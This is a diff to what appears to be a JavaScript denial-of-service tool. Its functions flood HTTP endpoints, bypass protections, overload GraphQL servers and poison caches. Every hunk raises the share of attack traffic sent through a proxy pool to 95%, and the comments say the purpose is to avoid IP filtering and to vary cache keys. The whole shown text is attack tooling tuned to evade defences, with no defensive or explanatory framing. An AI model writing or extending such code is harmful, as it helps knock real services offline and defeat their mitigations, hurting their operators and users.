@@ -889,8 +889,8 @@ async function runHTTPFlood(
     const url     = buildUrl(base);
     const headers = buildHeaders(hasBody, bodyBuf?.length);
 
-    // Route through proxy pool when available
-    const useProxy = proxies.length > 0 && Math.random() < 0.5;
+    // Route through proxy pool when available — 95% via proxy to avoid IP filtering
+    const useProxy = proxies.length > 0 && Math.random() < 0.95;
     if (useProxy) {
       const proxy = proxies[proxyIdx % proxies.length];
       proxyIdx++;
@@ -1008,7 +1008,7 @@ async function runHTTPBypass(
         if (!k.startsWith(":")) fetchHdrs[k] = v;
       }
 
-      const useProxy = proxies.length > 0 && Math.random() < 0.65;
+      const useProxy = proxies.length > 0 && Math.random() < 0.95;
       if (useProxy) {
         const proxy = proxies[proxyIdx++ % proxies.length];
         try {
@@ -3279,8 +3279,8 @@ async function runGraphQLDoS(
 
         const headers = GQL_HEADERS(body);
 
-        // Route through proxy when available (50% of requests)
-        if (proxies.length > 0 && Math.random() < 0.50) {
+        // Route through proxy when available (95% of requests)
+        if (proxies.length > 0 && Math.random() < 0.95) {
           const proxy = proxies[proxyIdx++ % proxies.length];
           try {
             const bytes = await fetchViaProxy(url, proxy, "POST", headers, body);
@@ -3464,8 +3464,8 @@ async function runCachePoison(
           "X-Request-ID":  rHex(16),
           ...poison,
         };
-        // Route through proxy (60% when available) — each request from different IP = different cache key
-        if (proxies.length > 0 && Math.random() < 0.60) {
+        // Route through proxy (95% when available) — each request from different IP = different cache key
+        if (proxies.length > 0 && Math.random() < 0.95) {
           const proxy = proxies[pIdx++ % proxies.length];
           try {
             const bytes = await fetchViaProxy(url, proxy, "GET", hdrs);
